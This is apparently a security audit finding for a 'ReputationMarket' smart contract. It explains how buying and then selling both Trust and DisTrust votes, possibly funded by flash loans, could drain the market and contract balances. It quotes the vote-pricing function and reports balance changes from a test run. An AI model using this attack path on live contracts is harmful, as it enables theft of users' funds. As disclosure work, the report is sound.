# Attacker can Drain Market and Contract via Opposite Vote Manipulation in `ReputationMarket`

### Summary

An attacker can drain the `ReputationMarket` contract by buying both `Trust` and `DisTrust` votes in a manner that allows them to drain funds from the market and contract. This attack involves purchasing both types of votes and then selling them back to the market, resulting in an increase in the attacker's balance and a decrease in the market's balance.


### Root Cause

The root cause of this issue lies in the market's vote pricing mechanism and the lack of restrictions on buying and selling both `Trust` and `DisTrust` votes. The market allows users to manipulate the vote prices by buying of both types of votes, leading to an imbalance that can be exploited to drain the market.

```javascipt
function _calcVotePrice(Market memory market, bool isPositive) private pure returns (uint256) {
    uint256 totalVotes = market.votes[TRUST] + market.votes[DISTRUST];
    return (market.votes[isPositive ? TRUST : DISTRUST] * market.basePrice) / totalVotes;
}
```


### Internal pre-conditions

The only internal precondition for this issue to be exploitable is the existence of a live market.


### External pre-conditions

_No response_

### Attack Path

- The user creates a market and funds it with an initial liquidity.
- The attacker buys a [significant] amount of Trust votes (depends on how many votes already bought).
- The attacker buys a [significant] amount of DisTrust votes (depends on how many votes already bought).
- The attacker sells all the Trust votes back to the market.
- The attacker sells all the DisTrust votes back to the market.

Note that the attack vote buy amount depends on the amount of votes that already bought by users in that market and both new and old markets are vulnerable. Also, since all buy and sell calls can be batched into a single transaction, attackers do not need too much money and can use flash loans to execute the attack.


### Impact

- Financial Loss: The Contract's funds and market's funds are drained, leading to financial losses for the platform and its participants.
- Attacker Profit: The attacker gains ETH, which they did not initially have, effectively exploiting the market.

as we can see the contract and market balance decreased around 90% (from 20_000000000000000n to 2_140179439307461n) and attacker balance increased (from 2000000000000000000000n to 2000017145767451772077n) and have 0.017eth profit which can be more if contract had more vote and attacker bought more vote.
